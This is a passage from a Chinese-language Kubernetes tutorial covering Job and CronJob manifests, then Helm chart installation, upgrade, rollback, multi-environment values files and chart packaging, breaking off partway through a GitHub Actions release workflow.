metadata.name 是资源类型和名字就不再解释，<code>completions</code> 指的是会创建 Pod 的数量，每个 pod 都会完成下面的任务。<code>parallelism</code> 指的是并发执行最大数量，例如下面就会先创建 3 个 pod 并发执行任务，一旦某个 pod 执行完成，就会再创建新的 pod 来执行，直到 5 个 pod 执行完成，Job 才会被标记为完成。</p><p><code>restartPolicy = &quot;OnFailure</code> 的含义和 Pod 生命周期相关，Pod 中的容器可能因为退出时返回值非零， 或者容器因为超出内存约束而被杀死等等。 如果发生这类事件，并且 <code>.spec.template.spec.restartPolicy = &quot;OnFailure&quot;</code>， Pod 则继续留在当前节点，但容器会被重新运行。因此，你的程序需要能够处理在本地被重启的情况，或者要设置 <code>.spec.template.spec.restartPolicy = &quot;Never&quot;</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Job</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-job</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">parallelism:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">completions:</span> <span class="hljs-number">5</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">OnFailure</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">echo</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span><br>          <span class="hljs-attr">command:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br>          <span class="hljs-attr">args:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;for i in 9 8 7 6 5 4 3 2 1 ; do echo $i ; done&quot;</span><br></code></pre></td></tr></table></figure><p>通过下面的命令创建 job，可以通过 <code>kubectl get pods -w</code> 来观察 job 创建 pod 的过程和结果。最后可以通过 <code>logs</code> 命令查看日志。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hello-job.yaml<br><br>kubectl get jobs                  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME        COMPLETIONS   DURATION   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job   5/5           19s        83s</span><br><br>kubectl get pods                      <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS      RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-5gjjr                     0/1     Completed   0          34s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-8ffmn                     0/1     Completed   0          26s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-ltsvm                     0/1     Completed   0          34s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-mttwv                     0/1     Completed   0          29s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-ww2qp                     0/1     Completed   0          34s</span><br><br>kubectl logs -f hello-job--1-5gjjr <br><span class="hljs-meta prompt_"># </span><span class="language-bash">1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br></code></pre></td></tr></table></figure><p>Job 完成时不会再创建新的 Pod，不过已有的 Pod <a href="https://kubernetes.io/docs/concepts/workloads/controllers/job/#pod-backoff-failure-policy">通常</a>也不会被删除。 保留这些 Pod 使得你可以查看已完成的 Pod 的日志输出，以便检查错误、警告或者其它诊断性输出。 可以使用 <code>kubectl</code> 来删除 Job（例如 <code>kubectl delete -f hello-job.yaml</code>)。当使用 <code>kubectl</code> 来删除 Job 时，该 Job 所创建的 Pod 也会被删除。</p><h2 id="CronJob"><a href="#CronJob" class="headerlink" title="CronJob"></a>CronJob</h2><p><em>CronJob</em> 可以理解为定时任务，创建基于 Cron 时间调度的 <a href="https://kubernetes.ion/docs/concepts/workloads/controllers/job/">Jobs</a>。</p><blockquote><p>CronJob 用于执行周期性的动作，例如备份、报告生成等。 这些任务中的每一个都应该配置为周期性重复的（例如：每天&#x2F;每周&#x2F;每月一次）； 你可以定义任务开始执行的时间间隔。</p></blockquote><p>Cron 时间表语法</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-section"># ┌───────────── 分钟 (0 - 59)</span><br><span class="hljs-section"># │ ┌───────────── 小时 (0 - 23)</span><br><span class="hljs-section"># │ │ ┌───────────── 月的某天 (1 - 31)</span><br><span class="hljs-section"># │ │ │ ┌───────────── 月份 (1 - 12)</span><br><span class="hljs-section"># │ │ │ │ ┌───────────── 周的某天 (0 - 6)（周日到周一；在某些系统上，7 也是星期日）</span><br><span class="hljs-section"># │ │ │ │ │                          或者是 sun，mon，tue，web，thu，fri，sat</span><br><span class="hljs-section"># │ │ │ │ │</span><br><span class="hljs-section"># │ │ │ │ │</span><br><span class="hljs-section"># * * * * <span class="hljs-emphasis">*</span></span><br></code></pre></td></tr></table></figure><p>用法除了需要加上 cron 表达式之外，其余基本和 Job 保持一致。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CronJob</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-cronjob</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">schedule:</span> <span class="hljs-string">&quot;* * * * *&quot;</span> <span class="hljs-comment"># Every minute</span><br>  <span class="hljs-attr">jobTemplate:</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">template:</span><br>        <span class="hljs-attr">spec:</span><br>          <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">OnFailure</span><br>          <span class="hljs-attr">containers:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">echo</span><br>              <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span><br>              <span class="hljs-attr">command:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br>              <span class="hljs-attr">args:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;for i in 9 8 7 6 5 4 3 2 1 ; do echo $i ; done&quot;</span><br></code></pre></td></tr></table></figure><p>使用命令和 Job 也基本保持一致，这里就不过多赘述。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hello-cronjob.yaml<br><span class="hljs-meta prompt_"># </span><span class="language-bash">cronjob.batch/hello-cronjob created</span><br><br>kubectl get cronjob                <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            SCHEDULE    SUSPEND   ACTIVE   LAST SCHEDULE   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-cronjob   * * * * *   False     0        &lt;none&gt;          8s</span><br><br>kubectl get pods   <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS      RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-cronjob-27694609--1-2nmdx        0/1     Completed   0          15s</span><br></code></pre></td></tr></table></figure><h1 id="Helm"><a href="#Helm" class="headerlink" title="Helm"></a>Helm</h1><p>2025年4月11日 · 2311 字</p><p>经过前面的教程，想必你已经对 kubernetes 的使用有了一定的理解。但是不知道你是否想过这样一个问题，就是我们前面教程中提到的所有资源，包括用 <code>pod</code>, <code>deployment</code>, <code>service</code>, <code>ingress</code>, <code>configmap</code>,<code>secret</code> 所有资源来部署一套完整的 <code>hellok8s</code> 服务的话，难道需要一个一个的 <code>kubectl apply -f</code> 来创建吗？如果换一个 namespace，或者说换一套 kubernetes 集群部署的话，又要重复性的操作创建的过程吗？</p><p>我们平常使用操作系统时，需要安装一个应用的话，可以直接使用 <code>apt</code> 或者 <code>brew</code> 来直接安装，而不需要关心这个应用需要哪些依赖，哪些配置。在使用 kubernetes 安装应用服务 <code>hellok8s</code> 时，我们自然也希望能够一个命令就安装完成，而提供这个能力的，就是 CNCF 的毕业项目 <a href="https://github.com/helm/helm">Helm</a>。</p><blockquote><p>Helm 帮助您管理 Kubernetes 应用—— Helm Chart，Helm 是查找、分享和使用软件构建 <a href="https://kubernetes.io/">Kubernetes</a> 的最优方式。</p><p>复杂性管理 ——即使是最复杂的应用，Helm Chart 依然可以描述， 提供使用单点授权的可重复安装应用程序。</p><p>易于升级 ——随时随地升级和自定义的钩子消除您升级的痛苦。</p><p>分发简单 —— Helm Chart 很容易在公共或私有化服务器上发版，分发和部署站点。</p><p>回滚 —— 使用 <code>helm rollback</code> 可以轻松回滚到之前的发布版本。</p></blockquote><p>我们通过 brew 来安装 helm。更多方式可以参考<a href="https://helm.sh/zh/docs/intro/install/">官方文档</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install helm<br></code></pre></td></tr></table></figure><p>Helm 的使用方式可以解释为：Helm 安装 <em>charts</em> 到 Kubernetes 集群中，每次安装都会创建一个新的 <em>release</em>。你可以在 Helm 的 chart <em>repositories</em> 中寻找新的 chart。</p><h2 id="用-helm-安装-hellok8s"><a href="#用-helm-安装-hellok8s" class="headerlink" title="用 helm 安装 hellok8s"></a>用 helm 安装 hellok8s</h2><p>开始本节教程前，我们先把之前手动创建的 hellok8s 相关的资源删除(防止使用 helm 创建同名的 k8s 资源失败)。</p><p>在尝试自己创建 hellok8s helm chart 之前，我们可以先来熟悉一下怎么使用 helm chart。在这里我先创建好了一个 hellok8s（包括会创建 deployment, service, ingress, configmaps, secret）的 helm chart。通过 GitHub actions 生成放在了 <a href="https://github.com/guangzhengli/k8s-tutorials/tree/gh-pages/">gh-pages</a> 分支下的 <code>index.yaml</code> 文件中。</p><p>接着可以使用下面命令进行快速安装，其中 <code>helm repo add</code> 表示将我创建好的 hellok8s chart 添加到自己本地的仓库当中，<code>helm install</code> 表示从仓库中安装 hellok8s&#x2F;hello-helm 到 k8s 集群当中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm repo add hellok8s https://guangzhengli.github.io/k8s-tutorials/<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">&quot;hellok8s&quot;</span> has been added to your repositories</span><br><br>helm install my-hello-helm hellok8s/hello-helm --version 0.1.0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME: my-hello-helm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAMESPACE: default</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">STATUS: deployed</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">REVISION: 1</span><br></code></pre></td></tr></table></figure><p>创建完成后，通过 <code>kubectl get</code> 等命令可以看到所有 hellok8s 资源都创建成功，<code>helm</code> 一条命令即可做到之前教程中所有资源的创建！通过 <code>curl</code> k8s 集群的 ingress 地址，也可以看到返回字符串！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                  READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-k8hpz   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-nzwg6   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-s89s7   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-6w76b      1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-tsqj5      1/1     Running   0          15h</span><br><br>kubectl get deployments<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                  READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment   3/3     3            3           15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment      2/2     2            2           15h</span><br><br>kubectl get service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">kubernetes                   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    13d</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.107.198.175   &lt;none&gt;        3000/TCP   15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-nginx-clusterip      ClusterIP   10.100.144.49    &lt;none&gt;        4000/TCP   15h</span><br><br>kubectl get ingress<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME               CLASS   HOSTS   ADDRESS     PORTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-ingress   nginx   *       localhost   80      15h</span><br><br>kubectl get configmap<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME               DATA   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-config    1      15h</span><br><br>kubectl get secret<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                  TYPE                                  DATA   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-secret                       Opaque                                1      15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sh.helm.release.v1.my-hello-helm.v1   helm.sh/release.v1</span><br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values[v2]!, From namespace: default, From host: hellok8s-deployment-598bbd6884-ttk78, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><h2 id="创建-helm-charts"><a href="#创建-helm-charts" class="headerlink" title="创建 helm charts"></a>创建 helm charts</h2><p>这段代码无法渲染，请查看：<a href="https://github.com/guangzhengli/k8s-tutorials#helm">https://github.com/guangzhengli/k8s-tutorials#helm</a></p><h2 id="rollback"><a href="#rollback" class="headerlink" title="rollback"></a>rollback</h2><p>Helm 也提供了 Rollback 的功能，我们先修改一下 <code>message: &quot;It works with Helm Values[v2]!&quot;</code> 加上 [v2]。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">application:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">hellok8s:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v6</span><br>    <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>    <span class="hljs-attr">message:</span> <span class="hljs-string">&quot;It works with Helm Values[v2]!&quot;</span><br>    <span class="hljs-attr">database:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEFAULT&quot;</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;db_password&quot;</span><br>  <span class="hljs-attr">nginx:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>再执行 <code>helm upgrade</code> 命令更新 k8s 资源，通过 <code>curl http://192.168.59.100/hello</code> 可以看到资源已经更新。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  hello-helm git:(main) ✗ helm upgrade --install hello-helm --values values.yaml .<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Release <span class="hljs-string">&quot;hello-helm&quot;</span> has been upgraded. Happy Helming!</span><br>NAME: hello-helm<br>NAMESPACE: default<br>STATUS: deployed<br>REVISION: 2<br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values[v2]!, From namespace: default, From host: hellok8s-deployment-598bbd6884-4b9bw, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><p>如果这一次更新有问题的话，可以通过 <code>helm rollback</code> 快速回滚。通过下面命令看到，和 deployment 的 rollback 一样，回滚后 REVISION 版本都会增大到 3 而不是回滚到 1，回滚后使用 <code>curl</code> 命令返回的 v1 版本的字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm ls<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            NAMESPACE       REVISION          STATUS          CHART                   APP VERSION</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-helm      default         2                 deployed        hello-helm-0.1.0        1.16.0</span> <br><br>helm rollback hello-helm 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Rollback was a success! Happy Helming!</span><br><br>helm ls<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            NAMESPACE       REVISION          STATUS          CHART                   APP VERSION</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-helm      default         3                 deployed        hello-helm-0.1.0        1.16.0</span> <br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values!, From namespace: default, From host: hellok8s-deployment-57d7df7964-482xw, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><h3 id="多环境配置"><a href="#多环境配置" class="headerlink" title="多环境配置"></a>多环境配置</h3><p>使用 Helm 也很容易多环境部署，新建 <code>values-dev.yaml</code> 文件，里面内容自定义 <code>dev</code> 环境需要的配置信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">application:</span><br>  <span class="hljs-attr">hellok8s:</span><br>    <span class="hljs-attr">message:</span> <span class="hljs-string">&quot;It works with Helm Values values-dev.yaml!&quot;</span><br>    <span class="hljs-attr">database:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEV&quot;</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;db_password_dev&quot;</span><br></code></pre></td></tr></table></figure><p>可以多次指定’–values -f’参数，最后（最右边）指定的文件优先级最高，这里最右边的是 <code>values-dev.yaml</code> 文件，所以 <code>values-dev.yaml</code> 文件中的值会覆盖 <code>values.yaml</code> 中相同的值，<code>-n dev</code> 表示在名字为 dev 的 namespace 中创建 k8s 资源，执行完成后，我们可以通过 <code>curl</code> 命令看到返回的字符串中读取的是 <code>values-dev.yaml</code> 文件的配置，并且 <code>From namespace = dev</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm upgrade --install hello-helm -f values.yaml -f values-dev.yaml -n dev .<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Release <span class="hljs-string">&quot;hello-helm&quot;</span> does not exist. Installing it now.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME: hello-helm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAMESPACE: dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">STATUS: deployed</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">REVISION: 1</span><br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values values-dev.yaml!, From namespace: dev, From host: hellok8s-deployment-f5fff9df-89sn6, Get Database Connect URL: http://DB_ADDRESS_DEV, Database Connect Password: db_password_dev</span><br><br>kubectl get pods -n dev<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                 READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-89sn6   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-tkh6g   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f5fff9df-wmlpb   1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-cdlmf     1/1     Running   0          4m23s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-cgst2     1/1     Running   0          4m23s</span><br></code></pre></td></tr></table></figure><p>除此之外，还可以使用 ‘–set-file’ 设置独立的值，类似于 <code>helm upgrade --install hello-helm -f values.yaml -f values-dev.yaml --set application.hellok8s.message=&quot;It works with set helm values&quot; -n dev .</code> 方式在命令中设置 values 的值，可以随意修改相关配置，此方法在 CICD 中经常用到。</p><h2 id="helm-chart-打包和发布"><a href="#helm-chart-打包和发布" class="headerlink" title="helm chart 打包和发布"></a>helm chart 打包和发布</h2><p>上面的例子展示了我们可以用一行命令在一个新的环境中安装所有需要的 k8s 资源！那么如何将 helm chart 打包、分发和下载呢？在官网中，提供了两种教程，一种是以 <a href="https://helm.sh/zh/docs/howto/chart_repository_sync_example/">GCS 存储的教程</a>，还有一种是以 <a href="https://helm.sh/zh/docs/howto/chart_releaser_action/">GitHub Pages 存储的教程</a>。</p><p>这里我们使用第二种，并且使用 <a href="https://github.com/helm/chart-releaser-action">chart-releaser-action</a> 来做自动发布，该 action 会默认生成 helm chart 发布到 <code>gh-pages</code> 分支上，本教程的 hellok8s helm chart 就发布在了本仓库的<a href="https://github.com/guangzhengli/k8s-tutorials/tree/gh-pages/">gh-pages</a> 分支上的 <code>index.yaml</code> 文件中。</p><p>在使用 action 自动生成 chart 之前，我们可以先熟悉一下如何手动生成，在 <code>hello-helm</code> 目录下，执行 <code>helm package</code> 将chart目录打包到chart归档中。<code>helm repo index</code> 命令可以基于包含打包chart的目录，生成仓库的索引文件 <code>index.yaml</code>。</p><p>最后，可以使用 <code>helm upgrade --install *.tgz</code> 命令将该指定包进行安装使用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm package hello-helm<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Successfully packaged chart and saved it to: /Users/guangzheng.li/workspace/k8s-tutorials/hello-helm/hello-helm-0.1.0.tgz</span><br><br>helm repo index .<br><br>helm upgrade --install hello-helm hello-helm-0.1.0.tgz<br></code></pre></td></tr></table></figure><p>基于上面的步骤，你可能已经想到，所谓的 helm 打包和发布，就是 <code>hello-helm-0.1.0.tgz</code> 文件和 <code>index.yaml</code> 生成和上传的一个过程。而 helm 下载和安装，就是如何将 <code>.tgz</code> 和 <code>index.yaml</code> 文件下载和 <code>helm upgrade --install</code> 的过程。</p><p>接下来我们发布生成的 hellok8s helm chart，先将手动生成的 <code>hello-helm-0.1.0.tgz</code> 和 <code>index.yaml</code> 文件删除，后续使用 GitHub action 自动生成和发布这两个文件。</p><p>GitHub action 的代码可以参考 <a href="https://helm.sh/zh/docs/howto/chart_releaser_action/">官网文档</a> 或者本仓库 <code>.github/workflows/release.yml</code> 文件。代表当 push 代码到远程仓库时，将 <code>helm-charts</code> 目录下的所有 charts 自动打包和发布到 <code>gh-pages</code> 分支去(需要保证 <code>gh-pages</code> 分支已经存在，否则会报错)。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">Release</span> <span class="hljs-string">Charts</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-comment"># depending on default permission settings for your org (contents being read-only or read-write for workloads), you will have to add permissions</span><br>    <span class="hljs-comment"># see: https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token</span><br>    <span class="hljs-attr">permissions:</span><br>      <span class="hljs-attr">contents:</span> <span class="hljs-string">write</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span><br>        <span class="hljs-attr">uses:</span> <span 